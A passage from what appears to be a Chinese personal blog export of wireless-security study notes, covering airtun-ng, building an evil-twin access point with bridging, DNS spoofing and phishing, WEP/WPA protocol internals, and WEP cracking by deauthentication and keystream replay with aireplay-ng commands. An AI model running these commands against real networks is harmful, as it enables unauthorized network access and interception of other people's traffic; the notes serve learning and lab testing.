<li>某些防火墙会影响c/s间的通信</li>
</ul>
<h2 id="2-3-airtun-ng"><a href="#2-3-airtun-ng" class="headerlink" title="2.3-airtun-ng"></a>2.3-airtun-ng</h2><ul>
<li>无线入侵检测wIDS<ul>
<li>无线密码和BSSID</li>
<li>需要获取握手信息</li>
</ul>
</li>
<li>中继和存放<ul>
<li>repeate/replay</li>
</ul>
</li>
<li>wIDS<ul>
<li>WEP: airtun-ng -a <ap mac> -w SKA wlan2mon</ap></li>
<li>WPA: airtun-ng -a <ap mac> -p PSK -e kifi wlan2mon</ap></li>
<li>ifconfig at0 up</li>
<li>四步握手</li>
<li>理论上支持多AP的wIDS，但2个AP以上时可靠性会下降<ul>
<li>WPA: airtun-ng -a <ap mac> -p PSK -e kifi1 wlan2mon</ap></li>
<li>ifconfig at1 up</li>
<li>多ap不同信道时airodump -c 1，11 wlan2mon</li>
</ul>
</li>
</ul>
</li>
<li>repeate<ul>
<li>WDS/bridge</li>
<li>扩展无线侦听的距离</li>
<li>要求两块网卡都置入monitor模式</li>
<li>airtun-ng -a <ap mac> –repeat –bssid <ap mac> -i wlan0mon wlan2mon</ap></ap></li>
<li>wlan0mon ：收包的网卡</li>
<li>wlqn2mon：发包的网卡</li>
<li>-a：发包的源地址</li>
<li>—bssid ：过滤只发指定源地址的包（可选</li>
</ul>
</li>
<li>replay<ul>
<li>将抓取的cap文件重放到指定网卡</li>
<li>airtun-ng -a <source mac> -r 1.cap <interface></interface></li>
</ul>
</li>
</ul>
<h2 id="2-4-其它工具"><a href="#2-4-其它工具" class="headerlink" title="2.4-其它工具"></a>2.4-其它工具</h2><ul>
<li>bessid-ng</li>
<li>fern-wifi-cracker</li>
</ul>
]]></content>
      <categories>
        <category>无线安全</category>
      </categories>
      <tags>
        <tag>无线攻击</tag>
        <tag>Tool</tag>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>恶意AP相关</title>
    <url>/2018/02/18/wireless/%E6%81%B6%E6%84%8FAP%E7%9B%B8%E5%85%B3/</url>
    <content><![CDATA[<h1 id="EVIL-TWIN-AP-ROGUE-AP"><a href="#EVIL-TWIN-AP-ROGUE-AP" class="headerlink" title="EVIL TWIN AP / ROGUE AP"></a>EVIL TWIN AP / ROGUE AP</h1><h2 id="01-简介"><a href="#01-简介" class="headerlink" title="01-简介"></a>01-简介</h2><ul>
<li>流氓AP、恶意AP问题</li>
<li>蹭网（破解无线密码进入他人网络）与被蹭网（故意设置恶意AP，诱使受害者连接）</li>
<li>北上广20%的公共场所无限网络是伪造的（客户端流量流经AP，可进行嗅探等）</li>
<li>用于制作恶意AP的工具主要有两个：airbase-ng和hostapd</li>
</ul>
<h2 id="02-恶意AP攻击原理"><a href="#02-恶意AP攻击原理" class="headerlink" title="02-恶意AP攻击原理"></a>02-恶意AP攻击原理<a id="more"></a></h2><ul>
<li><p>airudump-ng发现周围存在的AP</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CH  8 ][ Elapsed: 3 mins ][ 2018-02-10 21:22 ][ paused output</span><br><span class="line"></span><br><span class="line">BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID</span><br><span class="line">C4:A8:1D:E1:65:F8  -46       51        9    0   1  54e  WPA2 CCMP   PSK  D-Link_DIR-612</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>airbase-ng --essid &quot;D-Link-free&quot; -c 1 wlan0mon</code>，伪造AP</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# airbase-ng --essid &quot;D-Link-free&quot; -c 1 wlan0mon</span><br><span class="line">21:25:11  Created tap interface at0</span><br><span class="line">21:25:11  Trying to set MTU on at0 to 1500</span><br><span class="line">21:25:11  Trying to set MTU on wlan0mon to 1800</span><br><span class="line">21:25:13  Access Point with BSSID 6C:FD:B9:B2:9B:9C started.</span><br></pre></td></tr></table></figure>
<ul>
<li><code>ifconfig -a</code>，发现出现一个新网卡at0</li>
<li>可以做成名称相似的，也可以一致的（更有欺骗性，但方便演示时区分，还是不要一致的好）</li>
<li>伪造的AP的MAC地址即网卡MAC地址（前6个16进制字节）</li>
<li>-a参数也可以指定其MAC地址为真实AP的（不指定，默认的话时网卡的MAC地址</li>
<li>airodump-ng也会发现伪造出的AP</li>
<li>airbase伪造AP时没有添加其它加密相关的参数，故默认时OPEN（随意连接不需要密码，也符合free）</li>
<li>若伪造的AP的ESSID、MAC地址、信道、加密方式均与真实的一样，再将其信号放至最大，完全可以以假乱真</li>
</ul>
</li>
<li><p>手机连接伪造的AP</p>
<ul>
<li><p>（手机端显示当前WiFi无互联网连接，但伪造的AP端发现客户端已连接</p>
<p><code>21:31:19 Client 70:F0:87:7F:2B:91 associated (unencrypted) to ESSID: &quot;D-Link-free&quot;</code></p>
</li>
<li><p>或者是手机端显示无法加入此网络，安卓模拟机试一下（安卓模拟器无法加入外部无线网络）</p>
</li>
<li><p>因为此步骤失败，故以下操作都只停留在理论层面，并未实践，可能是kali并未进行dhcp服务器配置的原因，并未深究，用到时再查</p>
</li>
</ul>
</li>
<li><p>kali上安装网卡桥接的工具包</p>
<ul>
<li><code>apt-get install bridge-utils</code></li>
<li>实现无线网卡wlan0与有线网卡eth0的连接</li>
<li>伪造的AP是由无线网卡创建的，其连同接入的客户端都属于网络1；而有线网卡eth0与其它主机都是属于网络2的；桥接之后，可以实现两个网络的连接</li>
<li>kali虚拟机设置的网络模式为桥接，即连接到家用路由器，其与物理机和正常AP是在一个网络的</li>
<li>若连入伪造AP的客户端即手机，可以打开路由器的web管理页面192.168.0.1，则两个网络桥接成功</li>
</ul>
</li>
<li><p>有线网卡与无线网卡的连接</p>
<ul>
<li><p><code>brctl addbr 网桥名称</code>（建立新的网桥）</p>
</li>
<li><p><code>brctl addif 网桥名称 eth0</code>（eth0为接口名称，为网桥增加接口）</p>
</li>
<li><p><code>brctl addif 网桥名称 at0</code>（at0为接口名称，为网桥增加成员接口）</p>
</li>
<li><p><code>ifconfig eth0 0.0.0.0 up</code>（启动成员接口）</p>
</li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ifconfig at0 0.0.0.0 up</span><br></pre></td></tr></table></figure>
<p>（启动成员接口）</p>
<ul>
<li>eth0和at0都是网桥的成员接口，不能有IP地址，故设置为0</li>
</ul>
</li>
<li><p><code>ifconfig 网桥名称 192.168.0.4 up</code>（这是原来eth0的IP，为网桥分配IP地址并启动）</p>
</li>
<li><p><code>route add -net 0.0.0.0 netmask 0.0.0.0 gw 192.168.0.4</code>（添加缺省路由，网络和掩码均为0，网管为网桥的IP地址）</p>
</li>
</ul>
</li>
<li><p>开启IP转发功能，即路由功能</p>
<ul>
<li><code>/prof/sys/net/ipv4/ip_forward</code>修改其内容，将0改为1</li>
</ul>
</li>
<li><p>若客户端连接至恶意AP，可进行DNS欺骗</p>
<ul>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dnspoof -i bridge -f host</span><br></pre></td></tr></table></figure>
<ul>
<li>-i，指定网桥</li>
<li>-f，指定用于欺骗的host文件</li>
<li><code>/usr/share/dsniff/dnsspoof.hosts</code>，为host文件示例</li>
</ul>
</li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apachet2ctl start</span><br></pre></td></tr></table></figure>
<ul>
<li>启动apache服务器</li>
<li>DNS欺骗后，将正常网址IP解析到本机</li>
<li>可进行钓鱼攻击</li>
</ul>
</li>
</ul>
</li>
<li><p>因为手机连接恶意AP失败，故都只停留在理论层面，并未实践，攻击原理便是如此</p>
</li>
</ul>
<h2 id="03-3vilTwinAttacker工具"><a href="#03-3vilTwinAttacker工具" class="headerlink" title="03-3vilTwinAttacker工具"></a>03-3vilTwinAttacker工具</h2><ul>
<li><p>简介</p>
<ul>
<li>图形化工具，集成其它工具，方便用户使用</li>
<li>自身并没有什么创新，而是集成了已有的各种工具（hostapd、dhcp等）</li>
<li>还有其它工具如WiFi-Pumpkin（github上）</li>
</ul>
</li>
<li><p>下载安装</p>
<ul>
<li><p>官网下载或git clone</p>
<ul>
<li>官网：<code>http://seclist.us/3viltwinattacker-v0-6-7-released-framework-for-rogue-wi-fi-access-point-attack.html</code></li>
<li><code>git clone https://github.com/wi-fi-analyzer/3vilTwinAttacker.git</code></li>
<li>实测官网下载解压后的成功，github上的或多或少存在问题，启动工具会失败</li>
</ul>
</li>
<li><p><code>cd 3vilTwinAttacker</code></p>
</li>
<li><p><code>./install.sh --install</code>（uninstall卸载）</p>
</li>
<li><p>需要安装dhcp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">install DHCP in Debian-based</span><br><span class="line">Ubuntu</span><br><span class="line">$ sudo apt-get install isc-dhcp-server</span><br><span class="line">Kali linux</span><br><span class="line">$ echo &quot;deb http://ftp.de.debian.org/debian wheezy main &quot; &gt;&gt; /etc/apt/sources.list</span><br><span class="line">$ apt-get update &amp;&amp; apt-get install isc-dhcp-server</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>使用</p>
<ul>
<li><p>直接<code>3vilTwinAttacker</code>启动（启动前先保证isc-dhcp-server是启动状态）</p>
</li>
<li><p>输入网关、网络名、使用的无线网卡，后启动AP</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-11/44044821.jpg?ynotemdtimestamp=1550490896649" alt="img"></p>
</li>
<li><p>创建恶意AP成功</p>
</li>
</ul>
</li>
<li><p>其它</p>
<ul>
<li>工具其它许多功能有待学习（如iptables配置、对STA抓包等）</li>
<li>但因后面手机端总是连接此AP失败，无法进行后续对客户端攻击演示，暂搁置</li>
<li>可能是iPhone手机有针对恶意AP的保护机制？日后换安卓机测试</li>
<li>从网上找其它搭建钓鱼WiFi的文章，来实践一下</li>
<li>其它类型工具还有WiFi-Pumpkin（github上）</li>
</ul>
</li>
</ul>
<h2 id="04-实例搭建恶意AP"><a href="#04-实例搭建恶意AP" class="headerlink" title="04-实例搭建恶意AP"></a>04-实例搭建恶意AP</h2><ul>
<li>相关链接：<ul>
<li><code>http://www.hackdig.com/07/hack-47472.htm</code></li>
<li><code>https://zhuanlan.zhihu.com/p/27386429</code></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>无线安全</category>
      </categories>
      <tags>
        <tag>无线安全</tag>
      </tags>
  </entry>
  <entry>
    <title>无线通信过程</title>
    <url>/2018/02/18/wireless/%E6%97%A0%E7%BA%BF%E9%80%9A%E4%BF%A1%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="无线通信过程"><a href="#无线通信过程" class="headerlink" title="无线通信过程"></a>无线通信过程</h1><h2 id="连接到无线网络（大体过程）"><a href="#连接到无线网络（大体过程）" class="headerlink" title="连接到无线网络（大体过程）"></a>连接到无线网络（大体过程）</h2><p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-2/65707860.jpg?ynotemdtimestamp=1550490771881" alt="img"></p>
<ul>
<li>Probe<ul>
<li>STA向所有信道发出probe帧，发现AP（AP工作的信道不是固定不变的</li>
<li>AP应道response</li>
</ul>
</li>
<li>Authentication<a id="more"></a><ul>
<li>STA向AP发送验证请求</li>
<li>发生认证过程（步骤可变</li>
<li>AP响应STA的认证结果</li>
</ul>
</li>
<li>Association<ul>
<li>STA发出关联请求</li>
<li>AP响应关联请求</li>
<li>关联成功，开始通信</li>
</ul>
</li>
</ul>
<h1 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h1><h2 id="WEP探测过程"><a href="#WEP探测过程" class="headerlink" title="WEP探测过程"></a>WEP探测过程</h2><blockquote>
<p>在probe和authentication时，若客户端和AP都采用WEP加密方式，则……</p>
</blockquote>
<ol>
<li><p>发送beacon，标识使用WEP加密</p>
<ul>
<li>AP通告STA要使用WEP加密方式来通信</li>
</ul>
</li>
<li><p>STA发送普通probe帧</p>
<ul>
<li>通常来说，许多厂商的产品都不会识别beacon中的WEP要求</li>
<li>而会发送一个普通的帧（不使用WEP</li>
</ul>
</li>
<li><p>AP响应一个probe response 帧声明其采用WEP加密</p>
<ul>
<li>AP再次接收到probe时，会响应一个response，再次声明要采用WEP加密</li>
</ul>
</li>
</ol>
<h2 id="WPA探测过程"><a href="#WPA探测过程" class="headerlink" title="WPA探测过程"></a>WPA探测过程</h2><ul>
<li>AP怎么标识其支持WPA方式加密？<ul>
<li>前面privacy处标识为1，标识支持加密（WEP便时如此</li>
<li>但WPA不同于WEP，除了上面的标识外，在数据包后面还会有WPA的相关Tag，用于标识这是WPA，而不是WEP（WEP只有前面的标识，没有后面的）</li>
</ul>
</li>
<li><p>其探测过程同WEP大同小异，只不过是WPA</p>
</li>
<li><p>若有两个不同AP，都支持WPA，则两个AP的beacon包内容不同，但都声明采用了WPA加密（不同厂商对802.11标准的实现方式不同</p>
</li>
<li>相关数据包的包头中包含WPA1字段信息</li>
</ul>
<h1 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h1><h2 id="WEP-OPEN认证过程"><a href="#WEP-OPEN认证过程" class="headerlink" title="WEP OPEN认证过程"></a>WEP OPEN认证过程</h2><blockquote>
<p>虽然采用WEP，但是认证是OPEN方式（即认证过程中不需要输入密码</p>
</blockquote>
<ul>
<li>WEP open认证与直接open认证通信过程相同</li>
<li>正确认证后通信数据被WEP加密（后续的通信是采用WEP的）</li>
<li>如果认证时客户端输入错误密码<ul>
<li>认证依然可以通过（authentication时是可以通过的，但是后续数据传输时会出错</li>
<li>AP将丢弃该STA的数据包<ul>
<li>起始向量被错误地密钥解密后完整性被破坏（因为密码是错误的）</li>
<li>但数据传输将失败</li>
</ul>
</li>
</ul>
</li>
<li>认证响应正确，身份验证正确</li>
</ul>
<h2 id="WEP-PSK认证过程"><a href="#WEP-PSK认证过程" class="headerlink" title="WEP PSK认证过程"></a>WEP PSK认证过程</h2><p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-2/53206916.jpg?ynotemdtimestamp=1550490771881" alt="img"></p>
<ul>
<li>STA发认证请求</li>
<li>AP返回随机challenge消息</li>
<li>STA使用PSK加密cha并发回给ap<ul>
<li>PSK为pre share key，预设共享密钥（AP端和客户端都会有）</li>
<li>传输的是加密的随机数，PSK不会出现在传输过程中</li>
</ul>
</li>
<li>ap使用psk解密密文，获得cha并与原始cha对比，相同则验证成功，不同则失败</li>
<li>注：大部分人无线驱动首先尝试open验证，如失败则尝试psk</li>
</ul>
<h2 id="WEP共享密钥认证过程"><a href="#WEP共享密钥认证过程" class="headerlink" title="WEP共享密钥认证过程"></a>WEP共享密钥认证过程</h2><ul>
<li>无论使用什么加密结构，关联过程完全相同<ul>
<li>sta向ap发送关联请求</li>
<li>ap向sta发送关联成功或失败结果</li>
</ul>
</li>
<li>隐藏AP<ul>
<li>STA关联包中必须包含目标AP的essid</li>
<li>嗅探到此关联包，说明有隐藏AP存在</li>
</ul>
</li>
</ul>
<h1 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h1><h2 id="加密-1"><a href="#加密-1" class="headerlink" title="加密"></a>加密</h2><ul>
<li>无线安全根源<ul>
<li>无线通信是基于广播的（广播便是指在范围内所有STA的都会收到）</li>
<li>802.11基于无线电波发射信息</li>
<li>嗅探侦听是主要问题</li>
<li>加密机制是必须手段</li>
</ul>
</li>
<li>wired equivalent privacy（WEP）<ul>
<li>802.11 标准的一部分</li>
<li>发布后不久被发现存在安全漏洞</li>
</ul>
</li>
<li>WI-FI protected access（WPA）取代WEP<ul>
<li>WPA2（802.11i标准</li>
</ul>
</li>
</ul>
<h2 id="open无加密网络"><a href="#open无加密网络" class="headerlink" title="open无加密网络"></a>open无加密网络</h2><ul>
<li>无任何加密机制</li>
<li>所有数据都可以被嗅探</li>
<li>STA和AP只协商拼配参数即可连入网络</li>
</ul>
<h2 id="WEP加密系统"><a href="#WEP加密系统" class="headerlink" title="WEP加密系统"></a>WEP加密系统</h2><ul>
<li>使用rivest cipher 4（RF4）算法加密流量内容，实现机密性<ul>
<li>RF4是对称加密算法</li>
</ul>
</li>
<li>CRC32 算法检查数据完整性</li>
<li>标准采用使用24位initialization vector（IV）</li>
<li>受美国加密技术出口限制法律的要求<ul>
<li>高于64位 key禁止出口</li>
<li>所以除24位 IV 之外，真实的key只有40位的版本被允许出口</li>
<li>出口限制法律撤销后实现了128位 key 的WEP版本（也含有同上的24bit IV）</li>
</ul>
</li>
</ul>
<h3 id="RC4算法"><a href="#RC4算法" class="headerlink" title="RC4算法"></a>RC4算法</h3><ul>
<li><p>RSA实验室研发的对称加密流算法</p>
<ul>
<li>实现简单</li>
<li>速度快</li>
</ul>
</li>
<li><p>加密：对明文流和密钥流进行XOR计算</p>
</li>
<li><p>解密：对密文流和密钥流进行XOR计算</p>
</li>
<li><p>RC4算法key由两个过程生成</p>
<ul>
<li>合并IV和SKA，利用KSA算法生成起始状态表</li>
<li>PRGA算法最终生成密钥流</li>
</ul>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-2/58934405.jpg?ynotemdtimestamp=1550490771881" alt="img"></p>
</li>
<li><p>加密流程</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-2/31220233.jpg?ynotemdtimestamp=1550490771881" alt="img"></p>
</li>
<li><p>解密流程</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-2/11529223.jpg?ynotemdtimestamp=1550490771881" alt="img"></p>
</li>
</ul>
<h2 id="WPA安全系统"><a href="#WPA安全系统" class="headerlink" title="WPA安全系统"></a>WPA安全系统</h2><ul>
<li><p>Wi-Fi Protected Access</p>
</li>
<li><p>802.11 i组为提高无线安全，开发两个新的链路层加密协议</p>
<ul>
<li>Temporal Key Integrity Protocol，TKIP（WPA1，较之WEP可动态改变密钥</li>
<li>Counter Mode with CBC-MAC，CCMP（WPA2</li>
</ul>
</li>
<li>WPA加密两种安全类型<ul>
<li>WPA个人：使用预设共享密钥视线身份验证</li>
<li>WPA企业：使用802.1x 和radius 服务器实现AAA</li>
</ul>
</li>
</ul>
<h3 id="WPA1"><a href="#WPA1" class="headerlink" title="WPA1"></a>WPA1</h3><ul>
<li>802.11 i 第三版草案</li>
<li>与WEP比较<ul>
<li>都采用逐包进行密钥加密</li>
<li>128位的key和48位的初向量（IV</li>
<li>RC4流加密数据</li>
<li>帧计数器避免重放攻击</li>
<li>TKIP使用Michael算法进行完整性校验（MIC）<ul>
<li>WEP CRC32</li>
</ul>
</li>
<li>兼容更早期版本硬件</li>
</ul>
</li>
</ul>
<h3 id="WPA2"><a href="#WPA2" class="headerlink" title="WPA2"></a>WPA2</h3><ul>
<li>依据802.11i 完全重新设计实现</li>
<li>也被称为robust security network（RSN</li>
<li>CCMP替代TKIP</li>
<li>AES加密算法取代了RC4</li>
<li>不兼容早期版本硬件</li>
</ul>
<h3 id="WPA企业连接过程"><a href="#WPA企业连接过程" class="headerlink" title="WPA企业连接过程"></a>WPA企业连接过程</h3><p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-2/11261183.jpg?ynotemdtimestamp=1550490771881" alt="img"></p>
<ul>
<li>协商安全协议</li>
<li>身份认证</li>
<li>密钥分发和验证</li>
<li>数据加密完整性</li>
</ul>
<h3 id="WPA-PSK"><a href="#WPA-PSK" class="headerlink" title="WPA-PSK"></a>WPA-PSK</h3><p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-2/79594752.jpg?ynotemdtimestamp=1550490771881" alt="img"></p>
<ul>
<li>协商安全协议</li>
<li>密钥分发和验证</li>
<li>数据加密完整性</li>
</ul>
<h4 id="协商安全协议"><a href="#协商安全协议" class="headerlink" title="协商安全协议"></a>协商安全协议</h4><ul>
<li>协商认证方式<ul>
<li>PSK/802.1x</li>
</ul>
</li>
<li>单播和组播/广播流量加密套件<ul>
<li>TKIP/CCMP</li>
</ul>
</li>
<li>STA通过probe获取无线网络信息<ul>
<li>速率</li>
<li>加密</li>
<li>通道</li>
<li>名称</li>
</ul>
</li>
</ul>
<h4 id="身份认证（WPA企业"><a href="#身份认证（WPA企业" class="headerlink" title="身份认证（WPA企业"></a>身份认证（WPA企业</h4><ul>
<li>身份认证基于EAP实现<ul>
<li>EAP-TLS，需要客户端和服务器证书</li>
<li>EAP-TTLS</li>
<li>PEAP混合身份验证，只需要服务器证书</li>
</ul>
</li>
<li>客户端选择身份认证方式</li>
<li>AP发送身份验证信息给radius server</li>
<li>radius server返回radius accept 表示认证成功<ul>
<li>其中包括master key，即MK</li>
</ul>
</li>
<li>AP通过EAP消息通知STA认证成功</li>
</ul>
<h4 id="密钥交换"><a href="#密钥交换" class="headerlink" title="密钥交换"></a>密钥交换</h4><p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-2/77293652.jpg?ynotemdtimestamp=1550490771881" alt="img"></p>
<ul>
<li>无线网络设计用于一组无线设备通信</li>
<li>关联到同一AP的设备共享无线通道</li>
<li>单播、广播、组播<ul>
<li>安全特性要求不同</li>
<li>单播通信需要单独密钥加密通信双方流量<ul>
<li>pairwise key：对偶密钥（PTK</li>
</ul>
</li>
<li>组播通信需要信任域内所有成员共享的同一密钥<ul>
<li>group key：组密钥（GTK</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="PMK"><a href="#PMK" class="headerlink" title="PMK"></a>PMK</h4><ul>
<li>安全上下文的顶级密钥<ul>
<li>MK进行TLS-PRF加密得出PMK</li>
</ul>
</li>
<li>基于服务密钥<ul>
<li>由上层身份验证方法服务器生成</li>
<li>从服务器通过radius传给AP</li>
<li>从AP通过EAP消息传给所有STA</li>
</ul>
</li>
<li>基于PSK共享密钥<ul>
<li>Essid+PSK+迭代次数4096—hash计算生成</li>
<li>STA和AP分别计算得出PMK，并不在网络中传递交换</li>
</ul>
</li>
<li>256位即32字节</li>
</ul>
<h4 id="密钥交换-1"><a href="#密钥交换-1" class="headerlink" title="密钥交换"></a>密钥交换</h4><ul>
<li><p>PTK的生成过程</p>
<ul>
<li>HMAC-SHA1散列算法</li>
<li>PRF-X散列算法</li>
</ul>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-2/66013725.jpg?ynotemdtimestamp=1550490771881" alt="img"></p>
</li>
<li><p>四步握手过程生成PTK</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-2/37676185.jpg?ynotemdtimestamp=1550490771881" alt="img"></p>
<ul>
<li>AP发送Anonence给STA</li>
<li>STA生成sconce计算出PTK</li>
<li>sconce加PTK的MIC发送AP</li>
<li>AP拿到Sconce计算出PTK</li>
<li>AP计算MIC与接收的MIC比对</li>
<li>MIC一致说明确定STA知道PMK</li>
<li>AP发GTK给STA</li>
<li>STA回复ACK并使用密钥加密</li>
</ul>
</li>
</ul>
<h4 id="数据加密和完整性"><a href="#数据加密和完整性" class="headerlink" title="数据加密和完整性"></a>数据加密和完整性</h4><ul>
<li>三种算法，如下<ul>
<li>TKIP4</li>
<li>CCMP5</li>
<li>WRAP6</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>无线安全</category>
      </categories>
      <tags>
        <tag>无线安全</tag>
      </tags>
  </entry>
  <entry>
    <title>WEP攻击</title>
    <url>/2018/02/18/wireless/WEP%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="01-WEP共享密钥破解"><a href="#01-WEP共享密钥破解" class="headerlink" title="01-WEP共享密钥破解"></a>01-WEP共享密钥破解</h1><h2 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1-简介"></a>1.1-简介</h2><ul>
<li>WEP的安全问题<ul>
<li>一发布就被发现存在安全隐患，已经被WPA/WPA2取代</li>
<li>因安全原因，大部分AP已不设置WEP，且针对WEP的攻击复杂（没有必要学？no）</li>
<li>但人员安全意识薄弱，仍存在使用WEP的现象，如火车站、家用路由器等，此外，有的企业因某些因素，不得不使用WEP</li>
</ul>
</li>
<li>WEP加密流程<a id="more"></a><ul>
<li>密钥和起始向量组合，通过加密算法，得到一个key的string，即密钥流</li>
<li>key流再与数据流data流进行逐位二进制加密</li>
</ul>
</li>
<li>WEP密码破解原理<ul>
<li>起始向量IV是随机产生的，但并非完全随机</li>
<li>每224个包可能出现一次IV重用（很大的概率重复出现）</li>
<li>得到IV及密文，分析得共享密码<ul>
<li>收集大量IV之后找出相同IV</li>
<li>通过抓包得到密文</li>
<li>二者进行比对，对大量数据进行计算分析，可以得出共享密码</li>
</ul>
</li>
</ul>
</li>
<li>IV数量<ul>
<li>收集的IV数量越多，破解的速度越快，精确度越高</li>
<li>即使没有收集到足够的IV，也可以通过暴力破解的形式，但暴力破解效率低（主动针对WPA</li>
<li>尽力收集足够多的IV，原则上，IV足够多的情况下，任何复杂程度的WEP密码都可以破解（即使采用512位密钥其他的还有64位、128位、256位、512位）</li>
</ul>
</li>
<li>准备测试的AP<ul>
<li>设置为WEP，认证类型为共享密钥（而非MAC绑定攻击中设置的开放系统）</li>
<li>WEP密钥格式：<ul>
<li>ASCII码：最长设置13个字符，来作为连接AP的无线密码<ul>
<li>13字符，13字节，13x8=104位</li>
<li>24位随机IV，104+24=128</li>
<li>密钥类型：一般路由器支持64和128（256和512受美国加密某法律的限制，出口到中国的只有64和128</li>
<li>若选择64位密钥，则最多设置5个字符，5x8+24=64位</li>
<li>为了更安全，一般选择位数多的，即128位</li>
</ul>
</li>
<li>十六进制：<ul>
<li>最多26个字符</li>
<li>因为16进制，所以2个字符一个字节，26个字符13字节，13x8=104位，同上……</li>
<li>因为牵扯进制转换，故一般选择ASCII码的密钥格式</li>
</ul>
</li>
</ul>
</li>
<li>设置之后，保存重启，使之生效</li>
</ul>
</li>
</ul>
<h2 id="1-2-WEP认证相关"><a href="#1-2-WEP认证相关" class="headerlink" title="1.2-WEP认证相关"></a>1.2-WEP认证相关</h2><ul>
<li><p>认证过程</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-2/53206916.jpg?ynotemdtimestamp=1550490828873" alt="img"></p>
<ul>
<li>STA发认证请求</li>
<li>AP返回随机challenge消息</li>
<li>STA使用PSK加密cha并发回给ap<ul>
<li>PSK为pre share key，预设共享密钥（AP端和客户端都会有）</li>
<li>传输的是加密的随机数，PSK不会出现在传输过程中</li>
</ul>
</li>
<li>ap使用psk解密密文，获得cha并与原始cha对比，相同则验证成功，不同则失败</li>
</ul>
</li>
<li><p>利用：</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-3/98141407.jpg?ynotemdtimestamp=1550490828873" alt="img"></p>
<ul>
<li>在airodump抓包过程中，若恰好有新的客户端在认证，则可以抓到challenge的明文和经过密钥流加密后的密文</li>
<li>明文和密文异或便可以得到原始的密钥流，keystream（由无线密码+IV组合，并加密后的密文，即这个密钥流也是一个密文</li>
<li>airodump可以抓到这个认证过程，并自动保存到本地，.xor后缀的文件</li>
<li>H可以利用这个密钥流来与AP进行认证（如WEP认证过程图），从而关联，进而进一步的攻击（因为这个密钥流是不变的，H也可以用于认证</li>
</ul>
</li>
</ul>
<h2 id="1-3-一般流程"><a href="#1-3-一般流程" class="headerlink" title="1.3-一般流程"></a>1.3-一般流程</h2><ul>
<li>前期准备阶段</li>
<li>启用monitor模式</li>
<li>启动抓包并保存抓包</li>
<li>Deauthenticatiion抓取XOR文件</li>
<li>利用XOR文件与AP建立连接</li>
<li>执行ARP重放及Deauthenticatiion触发ARP数据包</li>
<li>收集足够DATA后破解密码</li>
</ul>
<h3 id="（1）前期准备阶段"><a href="#（1）前期准备阶段" class="headerlink" title="（1）前期准备阶段"></a>（1）前期准备阶段</h3><ul>
<li>（网卡启动等必须步骤</li>
</ul>
<h3 id="（2）启动monitor模式"><a href="#（2）启动monitor模式" class="headerlink" title="（2）启动monitor模式"></a>（2）启动monitor模式</h3><ul>
<li>airmon-ng，</li>
</ul>
<h3 id="（3）启动抓包并保存抓包"><a href="#（3）启动抓包并保存抓包" class="headerlink" title="（3）启动抓包并保存抓包"></a>（3）启动抓包并保存抓包</h3><ul>
<li>airodump-ng，</li>
</ul>
<h3 id="（4）Deauthentication抓取XOR文件"><a href="#（4）Deauthentication抓取XOR文件" class="headerlink" title="（4）Deauthentication抓取XOR文件"></a>（4）Deauthentication抓取XOR文件</h3><ul>
<li><p>执行此步骤的目的：</p>
<ul>
<li>抓包时恰好有新STA进行身份认证，运气是没那么好的</li>
<li>即使正好有其它的认证过程，但是抓包也不是面面俱到的，也可能遗漏这个认证包</li>
<li>为了保证效率，手动将其断掉，再让其主动重连</li>
</ul>
</li>
<li><p>H分别向AP和正常STA发送某请求，使二者暂时断开</p>
</li>
<li>因为无线的网络质量是不稳定的，所以客户端有这样的重连机制：一旦其与AP暂时断开（丢失几个包，其就会主动重新与AP进行认证、关联等操作，H就可以抓到</li>
<li>与新STA加入AP的过程是一样的，同样可以获得xor文件</li>
<li>aireplay-ng注入包：<code>aireplay-ng -0 1 -a MAC1 -c MAC2 wlan0mon</code></li>
</ul>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-3/59213738.jpg?ynotemdtimestamp=1550490828873" alt="img"></p>
<ul>
<li>一个包足矣让其二者断开，若失败则尝试多发</li>
<li>-0：断开SAT与AP的连接</li>
</ul>
<h3 id="（5）利用XOR文件与AP建立关联"><a href="#（5）利用XOR文件与AP建立关联" class="headerlink" title="（5）利用XOR文件与AP建立关联"></a>（5）利用XOR文件与AP建立关联</h3><ul>
<li><p>aireplay-ng，注入包，以认证与关联AP</p>
</li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aireplay-ng -1 60 -e kifi -y wep-xx-xx-xx-xx-xx-xx.xor -a MAC1 -h MAC MAC2 wlan0mon</span><br></pre></td></tr></table></figure>
<ul>
